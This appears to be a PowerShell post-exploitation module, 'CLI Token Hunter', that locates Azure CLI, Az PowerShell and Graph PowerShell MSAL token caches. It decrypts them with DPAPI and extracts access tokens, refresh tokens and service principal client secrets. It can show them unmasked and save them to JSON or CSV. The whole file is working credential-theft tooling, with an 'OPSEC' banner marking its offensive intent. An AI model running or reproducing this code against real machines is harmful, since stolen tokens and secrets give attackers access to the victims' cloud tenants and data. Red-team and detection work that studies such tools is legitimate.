
# === Shared helpers (script scope) ===

# helper: mask long secrets in output
function Mask-Secret {
    param(
        [Parameter(Mandatory=$true)][AllowNull()][string]$Value,
        [int]$KeepStart = 6,
        [int]$KeepEnd   = 6
    )
    if ([string]::IsNullOrEmpty($Value)) { return $Value }
    if ($Value.Length -le ($KeepStart + $KeepEnd)) { return ('*' * $Value.Length) }
    $start = $Value.Substring(0, $KeepStart)
    $end   = $Value.Substring($Value.Length - $KeepEnd)
    return "$start...$end"
}

# Helper: reads file bytes
function Get-BinaryContent {
    param(
        [parameter(Mandatory=$true, ValueFromPipeline, Position=0)]
        [string]$Path
    )
    Process {
        if($PSVersionTable.PSVersion.Major -ge 6) {
            Get-Content -Path $Path -AsByteStream -Raw -ErrorAction $ErrorActionPreference
        } else {
            Get-Content -Path $Path -Encoding Byte -ErrorAction $ErrorActionPreference
        }
    }
}

# helpers to read DPAPI/plain JSON for service principals cache

function Read-DpapiOrJson {
    param([Parameter(Mandatory)][string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { throw "File not found: $Path" }

    # Treat IdentityService caches and any *.cache[.cae|.nocae] or *.bin as DPAPI
    $isDpapi =
        ($Path -match '\\\.IdentityService\\' -or $Path -match '\.IdentityService/') -or
        ($Path -match '\.bin$') -or
        ($Path -match '\.cache($|\.cae$|\.nocae$)')

    if ($isDpapi) {
        Add-Type -AssemblyName System.Security
        $bytes  = Get-BinaryContent -Path $Path
        $clear  = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser')
        return [Text.Encoding]::UTF8.GetString($clear)
    } else {
        return Get-Content -LiteralPath $Path -Raw -ErrorAction Stop
    }
}


function ConvertFrom-JsonSafe {
    param([Parameter(Mandatory)][string]$Json)
    try { return $Json | ConvertFrom-Json -ErrorAction Stop }
    catch { throw "Invalid JSON content: $($_.Exception.Message)" }
}

# Parse service_principal_entries.* (Windows: .bin via DPAPI; Linux/macOS: .json cleartext)
function Parse-SPEntries {
    param([Parameter(Mandatory)][object]$Data)

    $items =
        if ($Data -is [System.Collections.IEnumerable]) { $Data }
        elseif ($Data.PSObject.Properties.Name -contains 'service_principal_entries') { $Data.service_principal_entries }
        else { @($Data) }

    $out = foreach ($e in $items) {
        [pscustomobject]@{
            Source     = 'ServicePrincipalEntries'
            TenantId   = $e.tenant
            AppId      = $e.client_id
            Name       = $e.name
            Secret     = $e.client_secret
            KeyType    = 'ServicePrincipal'
            ValueType  = 'client_secret'
        }
    }
    return $out
}

# Parse keystore.cache (DPAPI JSON). 

function Parse-KeyStoreEntries {
    param([Parameter(Mandatory)][object]$Data)

    $items = if ($Data -is [System.Collections.IEnumerable]) { $Data } else { @($Data) }

    $out = foreach ($item in $items) {
        if (-not $item.keyType -or $item.keyType -ne 'ServicePrincipalKey') { continue }

        $key = $item.keyStoreKey
        if ($key -is [string]) {
            try { $key = $key | ConvertFrom-Json -ErrorAction Stop } catch { $key = $null }
        }

        $appId   = if ($key) { $key.appId }    else { $null }
        $tenant  = if ($key) { $key.tenantId } else { $null }
        $name    = if ($key) { $key.name }     else { $null }

        [pscustomobject]@{
            Source     = 'KeyStore'
            TenantId   = $tenant
            AppId      = $appId
            Name       = $name
            Secret     = $item.keyStoreValue
            KeyType    = $item.keyType
            ValueType  = $item.valueType
        }
    }
    return $out
}



# === Reusable MSAL cache processor (single file) ===
function Process-MsalCacheFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$Path,
        [string]$Label = 'MSAL'   # e.g., AzureCLI, AzPowerShell, GraphPowerShell
    )

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "MSAL cache not found at '$Path'."
    }

        # Read + DPAPI decrypt (handle .bin, .cache, .cache.cae, .cache.nocae, IdentityService paths)
    $raw = $null
    $mustDpapi =
        ($Path -match '\\\.IdentityService\\' -or $Path -match '\.IdentityService/') -or
        ($Path -match '\.bin$') -or
        ($Path -match '\.cache($|\.cae$|\.nocae$)')

    try {
        if ($mustDpapi) {
            try {
                Add-Type -AssemblyName System.Security
                $decBytes = Get-BinaryContent -Path $Path
                $unprot   = [System.Security.Cryptography.ProtectedData]::Unprotect($decBytes, $null, 'CurrentUser')
                $raw      = [Text.Encoding]::UTF8.GetString($unprot)
            } catch {
                
                $raw = Get-Content -LiteralPath $Path -Raw -ErrorAction Stop
            }
        } else {
            $raw = Get-Content -LiteralPath $Path -Raw -ErrorAction Stop
        }
    } catch {
        throw "Failed to read/decrypt MSAL cache at '$Path': $($_.Exception.Message)"
    }


    # Parse JSON
    try {
        $objTokens = $raw | ConvertFrom-Json -ErrorAction Stop
    } catch {
        throw "MSAL cache content is not valid JSON. Path: '$Path'. Error: $($_.Exception.Message)"
    }

    

    # Index RefreshToken
    $rtIndex = @{}
    if ($null -ne $objTokens.RefreshToken) {
    foreach ($rt in ($objTokens.RefreshToken | Get-Member -MemberType NoteProperty)) {
        $rtProps = Parse-ObjectDefinition -Definition $rt.Definition
        if ([string]::IsNullOrWhiteSpace($rtProps.home_account_id)) { continue }
        if ([string]::IsNullOrWhiteSpace($rtProps.client_id))       { continue }
        $normTarget = Normalize-Target $rtProps.target
        $key = '{0}|{1}|{2}' -f $rtProps.home_account_id, $rtProps.client_id, $normTarget
        $rtIndex[$key] = $rtProps
    } 
}

    # build user map from Account
    $users = [ordered]@{}
    if ($null -ne $objTokens.Account) {
    foreach ($acct in ($objTokens.Account | Get-Member -MemberType NoteProperty)) {
        $acctProps = Parse-ObjectDefinition -Definition $acct.Definition
        if ($acctProps.home_account_id) { $users[$acctProps.home_account_id] = $acctProps.username }
    }
    }
    # join AccessToken -> RefreshToken
    $results = @()
    $nowSec  = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
if ($null -ne $objTokens.AccessToken) {
    foreach ($at in ($objTokens.AccessToken | Get-Member -MemberType NoteProperty)) {
        $atProps = Parse-ObjectDefinition -Definition $at.Definition

        if ([string]::IsNullOrWhiteSpace($atProps.home_account_id)) { continue }
        if ([string]::IsNullOrWhiteSpace($atProps.client_id))       { continue }

        $userName   = $users[$atProps.home_account_id]
        $normTarget = Normalize-Target $atProps.target

        # 3-level fallback for RT
        $exactKey = '{0}|{1}|{2}' -f $atProps.home_account_id, $atProps.client_id, $normTarget
        $rtProps  = $null
        if ($rtIndex.ContainsKey($exactKey)) {
            $rtProps = $rtIndex[$exactKey]
        } else {
            $prefixAC = '{0}|{1}|' -f $atProps.home_account_id, $atProps.client_id
            $rtProps = ($rtIndex.GetEnumerator() |
                Where-Object { $_.Key -like "$prefixAC*" } |
                Select-Object -First 1).Value
            if ($null -eq $rtProps) {
                $prefixA = '{0}|' -f $atProps.home_account_id
                $rtProps = ($rtIndex.GetEnumerator() |
                    Where-Object { $_.Key -like "$prefixA*" } |
                    Select-Object -First 1).Value
            }
        }

        # expiry
        $expSec = $null
        if ($atProps.PSObject.Properties.Match('expires_on').Count -gt 0 -and $atProps.expires_on) {
            try { $expSec = [Int64]$atProps.expires_on } catch {
                try { $expSec = [Int64][double]$atProps.expires_on } catch { $expSec = $null }
            }
        }
        $expiresOnLocal = if ($expSec) { Convert-FromEpoch -EpochTime $expSec } else { $null }
        $isExpired      = if ($expSec) { [bool]($expSec -le $nowSec) } else { $null }

        # RT last_modification_time
        $rtLastModLocal = $null
        if ($null -ne $rtProps -and $rtProps.PSObject.Properties.Match('last_modification_time').Count -gt 0 -and $rtProps.last_modification_time) {
            try { $rtLastModLocal = Convert-FromEpoch -EpochTime ([Int64]$rtProps.last_modification_time) } catch { $rtLastModLocal = $null }
        }

        $refresh = if ($null -ne $rtProps) { $rtProps.secret } else { $null }

        $attributes = [ordered]@{
            UserName             = $userName
            access_token         = $atProps.secret
            AT_Expired           = $isExpired
            AT_ExpiresOnLocal    = $expiresOnLocal
            refresh_token        = $refresh
            RT_LastModifiedLocal = $rtLastModLocal
            Source               = $Label
            SourcePath           = $Path
        }
        $results += New-Object psobject -Property $attributes
    } 
}

    # === End:  pipeline ===

    return $results
}




# Enumerates MSAL tokens from the Azure CLI cache
function Invoke-CLITokenHunter {
    [CmdletBinding()]
param(
    [string]$MSALCache,
    [switch]$Unmasked,
    [string]$SessionVarName = 'CLITokenHunterResults',
    [string]$OutFile,
    [ValidateSet('JSON','CSV')]
    [string]$OutFormat = 'JSON',
    [switch]$IdentityServiceHunter,
    [string]$IdentityServiceDir,

    # --- New: integrated Service Principal hunter ---
    [switch]$ServicePrincipalHunter,                # when present, also enumerate SP secrets
    [string]$SPEntriesPath,                         # service_principal_entries.bin/.json
    [string]$KeyStorePath,                          # keystore.cache (Windows)
    [string]$SPSessionVarName = 'CLIServicePrincipalResults',
    [string]$SPOutFile                                         # optional separate output for SP results
    
)





#  top banner function
function Show-Banner {
    param(
        [Parameter(Mandatory)]
        [string]$CachePath,

        [Parameter(Mandatory)]
        [bool]$UsingDPAPI
    )

    $name    = 'CLI Token Hunter'
    $version = 'v2.0'
    $tsUtc   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss 'UTC'")
    $author  = 'Edrian Miranda - Obikuro'
    $psver   = $PSVersionTable.PSVersion.ToString()

    $rule = ('=' * 72)

    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ("{0} {1}" -f $name, $version) -ForegroundColor Magenta
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ("[*] Time (UTC)   : {0}" -f $tsUtc) -ForegroundColor Cyan
    Write-Host ("[*] Author       : {0}" -f $author) -ForegroundColor Cyan
    Write-Host ("[*] PowerShell   : {0}" -f $psver) -ForegroundColor Cyan
    Write-Host ("[*] Cache Path   : {0}" -f $CachePath) -ForegroundColor Cyan
    Write-Host ("[*] DPAPI        : {0}" -f $UsingDPAPI) -ForegroundColor Cyan
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host "[!] OPSEC: No file output in this step (pipeline only)." -ForegroundColor Cyan
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ""
}







# Helper: converts MSAL cache entry text (e.g., "@{name=val; ...}") into a PSObject (ordered properties).


function Parse-ObjectDefinition {
            Param(
                [Parameter(Mandatory=$True)]
                [String]$Definition
            )
            Process
            {
                
                $Definition = $Definition.Substring($Definition.IndexOf("@"))

                
                $Definition = $Definition.Substring(2,$Definition.Length-3)

                $attributes = [ordered]@{}
                if(-not [string]::IsNullOrEmpty($Definition))
                {
                   
                    $properties = $Definition.Split("; ")

                    
                    foreach($property in $properties)
                    {
                        
                        $parts = $property.Split("=")
                        if(-not [string]::IsNullOrEmpty($parts[0]))
                        {
                            $attributes[$parts[0]] = $parts[1]
                        }
                    }
                }

                return New-Object -TypeName psobject -Property $attributes
            } }

# helper: normalizes MSAL "target" (scope list) by collapsing whitespace.
            
function Normalize-Target {
    param([string]$t)
    if ([string]::IsNullOrWhiteSpace($t)) { return "" }
    
    return (($t -split '\s+' -ne '' -join ' ').Trim())
}







# helper: converts epoch seconds to local time
function Convert-FromEpoch {
    param (
        [Parameter(Mandatory = $true)]
        [int64]$EpochTime
    )
    return [System.DateTimeOffset]::FromUnixTimeSeconds($EpochTime).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss")
}


# === Aggregate tokens from Azure CLI cache and (optionally) IdentityService caches ===

# Resolve default Azure CLI cache path (unchanged behavior)
if ([string]::IsNullOrEmpty($MSALCache)) {
    switch ([System.Environment]::OSVersion.Platform) {
        'Unix'   { $MSALCache = "$HOME/.azure/msal_token_cache.json" }
        'MacOSX' { $MSALCache = "$HOME/.azure/msal_token_cache.json" }
        default  { $MSALCache = "$env:HOMEDRIVE$env:HOMEPATH\.Azure\msal_token_cache.bin" }
    }
}

# Banner DPAPI flag for primary cache (preserved)
$DPAPI = $false
if ($MSALCache -match '\.json$') { $DPAPI = $false }
if ($MSALCache -match '\.(bin|cache)$') { $DPAPI = $true }

# Show banner (preserved)
if (-not $DPAPI) { $DPAPI = $false }
Show-Banner -CachePath $MSALCache -UsingDPAPI:$DPAPI

# Collect primary CLI cache tokens
$access_tokens = @()
if (Test-Path -LiteralPath $MSALCache) {
    $access_tokens += Process-MsalCacheFile -Path $MSALCache -Label 'AzureCLI'
} else {
    if (-not $ServicePrincipalHunter -and -not $IdentityServiceHunter) {
        throw "MSAL cache not found at '$MSALCache'. Ensure Azure CLI has signed in on this profile."
    } else {
        Write-Host "[!] MSAL cache not found at '$MSALCache'. Skipping MSAL token hunting and continuing with other modes." -ForegroundColor Yellow
    }
}


# Optionally collect IdentityService caches (Az PowerShell & Graph PowerShell)
if ($IdentityServiceHunter) {
    $idsDir = if ($IdentityServiceDir) { $IdentityServiceDir } else { Join-Path $env:LOCALAPPDATA '.IdentityService' }
    $idsFiles = @('msal.cache','msal.cache.cae','msal.cache.nocae','mg.msal.cache.cae','mg.msal.cache.nocae') |
        ForEach-Object { Join-Path $idsDir $_ } |
        Where-Object { Test-Path -LiteralPath $_ }

    if ($idsFiles.Count -gt 0) {
        Write-Host "[*] IdentityService directory: $idsDir" -ForegroundColor Cyan
        foreach ($f in $idsFiles) {
            try {
                $name  = [IO.Path]::GetFileName($f)
                $label = if ($name -like 'mg.msal.*') { 'GraphPowerShell' } else { 'AzPowerShell' }
                $access_tokens += Process-MsalCacheFile -Path $f -Label $label
            } catch {
                Write-Host "[!] Failed to process IdentityService cache '$f' : $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
    } else {
        Write-Host "[!] No IdentityService caches found in: $idsDir" -ForegroundColor Yellow
    }
}

# Optional: dedupe across sources
$access_tokens = $access_tokens | Sort-Object UserName, access_token, AT_ExpiresOnLocal -Unique




# Make results available across the session in a global variable
if ([string]::IsNullOrWhiteSpace($SessionVarName)) { $SessionVarName = 'CLITokenHunterResults' }
Set-Variable -Name $SessionVarName -Value $access_tokens -Scope Global -Force
Write-Host ("[+] Results available in variable: {0} (count: {1})" -f $SessionVarName, ($access_tokens | Measure-Object).Count) -ForegroundColor Green


#  save to file 
if ($OutFile) {
    try {
        switch ($OutFormat) {
            'CSV' {
                $access_tokens | Export-Csv -Path $OutFile -NoTypeInformation -Force -Encoding UTF8
            }
            'JSON' {
                $access_tokens | ConvertTo-Json -Depth 6 | Out-File -FilePath $OutFile -Encoding UTF8 -Force
            }
        }
        Write-Host ("[+] Saved results to file: {0} ({1})" -f $OutFile, $OutFormat) -ForegroundColor Green
    } catch {
        Write-Host ("[!] Failed to save results to file: {0} - {1}" -f $OutFile, $_.Exception.Message) -ForegroundColor Yellow

    }
}



# Final display 

# Resolve the configured session var name 
$__resVar = Get-Variable -Name $SessionVarName -Scope Global -ErrorAction SilentlyContinue
$__results = if ($__resVar) { $__resVar.Value } else { @() }

Write-Host "[+] Found Users:" -ForegroundColor Green
Write-Host "$((($__results | Where-Object { $_.UserName }) | Select-Object -ExpandProperty UserName -Unique) -join ' <---> ')"


# masked by default; full when -Unmasked is used
if ($Unmasked) {
   $__results |
  Select-Object UserName,
                access_token,
                AT_Expired, AT_ExpiresOnLocal,
                refresh_token, RT_LastModifiedLocal,
                Source, SourcePath |
  Format-List

}
else {
    $__results |
  Select-Object UserName,
    @{n='access_token';  e={ Mask-Secret $_.access_token }},
    AT_Expired, AT_ExpiresOnLocal,
    @{n='refresh_token'; e={ Mask-Secret $_.refresh_token }},
    RT_LastModifiedLocal, Source, SourcePath |
  Format-Table -AutoSize
}


# ================================
# Integrated Service Principal Hunter 
# ================================
if ($ServicePrincipalHunter) {
    Write-Host ""
    Write-Host ('=' * 72) -ForegroundColor DarkGray
    Write-Host "CLI Service Principal Hunter (Integrated) v1.0" -ForegroundColor Magenta
    Write-Host ('=' * 72) -ForegroundColor DarkGray

    # Defaults by platform if no explicit paths supplied
    if ([string]::IsNullOrEmpty($SPEntriesPath) -and [string]::IsNullOrEmpty($KeyStorePath)) {
        switch ([System.Environment]::OSVersion.Platform) {
            'Unix'   { $SPEntriesPath = "$HOME/.azure/service_principal_entries.json" }
            'MacOSX' { $SPEntriesPath = "$HOME/.azure/service_principal_entries.json" }
            default  {  # Windows
                $SPEntriesPath = "$HOME\.Azure\service_principal_entries.bin"
                $KeyStorePath  = "$HOME\.Azure\keystore.cache"
            }
        }
    }

    $spResults = @()

    # service_principal_entries.* (DPAPI on Windows .bin, cleartext JSON on *nix)
    if ($SPEntriesPath -and (Test-Path -LiteralPath $SPEntriesPath)) {
        try {
            $spText  = Read-DpapiOrJson -Path $SPEntriesPath
            $spData  = ConvertFrom-JsonSafe -Json $spText
            $spResults += Parse-SPEntries -Data $spData | ForEach-Object {
                $_ | Add-Member -NotePropertyName 'SourcePath' -NotePropertyValue $SPEntriesPath -PassThru
            }
        } catch {
            Write-Host "[!] Failed to process $SPEntriesPath : $($_.Exception.Message)" -ForegroundColor Yellow
        }
    } else {
        if ($SPEntriesPath) {
            Write-Host "[!] Not found: $SPEntriesPath" -ForegroundColor Yellow
        }
    }

    # keystore.cache (Windows DPAPI JSON)
    if ($KeyStorePath -and (Test-Path -LiteralPath $KeyStorePath)) {
        try {
            $ksText  = Read-DpapiOrJson -Path $KeyStorePath
            $ksData  = ConvertFrom-JsonSafe -Json $ksText
            $spResults += Parse-KeyStoreEntries -Data $ksData | ForEach-Object {
                $_ | Add-Member -NotePropertyName 'SourcePath' -NotePropertyValue $KeyStorePath -PassThru
            }
        } catch {
            Write-Host "[!] Failed to process $KeyStorePath : $($_.Exception.Message)" -ForegroundColor Yellow
        }
    } else {
        if ($KeyStorePath) {
            Write-Host "[!] Not found: $KeyStorePath" -ForegroundColor Yellow
        }
    }

    # Persist & report
    if ([string]::IsNullOrWhiteSpace($SPSessionVarName)) { $SPSessionVarName = 'CLIServicePrincipalResults' }
    Set-Variable -Name $SPSessionVarName -Scope Global -Force -Value $spResults
    Write-Host ("[+] Service principal results available: {0} (count: {1})" -f $SPSessionVarName, $spResults.Count) -ForegroundColor Green

    # Optional file output (uses same OutFormat as tokens)
    if ($SPOutFile) {
        try {
            switch ($OutFormat) {
                'CSV'  { $spResults | Export-Csv -Path $SPOutFile -NoTypeInformation -Force -Encoding UTF8 }
                'JSON' { $spResults | ConvertTo-Json -Depth 6 | Out-File -FilePath $SPOutFile -Encoding UTF8 -Force }
            }
            Write-Host ("[+] Saved SP results to file: {0} ({1})" -f $SPOutFile, $OutFormat) -ForegroundColor Green
        } catch {
            Write-Host ("[!] Failed to save SP results to file: {0} - {1}" -f $SPOutFile, $_.Exception.Message) -ForegroundColor Yellow
        }
    }

    # Console view (masked by default)
    $__spVar  = Get-Variable -Name $SPSessionVarName -Scope Global -ErrorAction SilentlyContinue
    $__sps    = if ($__spVar) { $__spVar.Value } else { @() }

    if ($Unmasked) {
        $__sps | Select-Object TenantId, AppId, Name, Secret, Source, SourcePath | Format-List
    } else {
        $__sps | Select-Object TenantId, AppId, Name,
            @{n='Secret'; e={ Mask-Secret $_.Secret }},
            Source, SourcePath | Format-Table -AutoSize
    }
}




}

function Invoke-CLIServicePrincipalHunter {
    [CmdletBinding()]
    param(
        [switch]$Unmasked,
        [string]$SPEntriesPath,
        [string]$KeyStorePath,
        [string]$SessionVarName = 'CLIServicePrincipalResults',
        [string]$OutFile,
        [ValidateSet('JSON','CSV')][string]$OutFormat = 'JSON'
    )
    # Call the unified hunter
    Invoke-CLITokenHunter -ServicePrincipalHunter `
        -Unmasked:$Unmasked `
        -SPEntriesPath $SPEntriesPath `
        -KeyStorePath $KeyStorePath `
        -SPSessionVarName $SessionVarName `
        -SPOutFile $OutFile `
        -OutFormat $OutFormat | Out-Null
}




Export-ModuleMember -Function Invoke-CLITokenHunter, Invoke-CLIServicePrincipalHunter
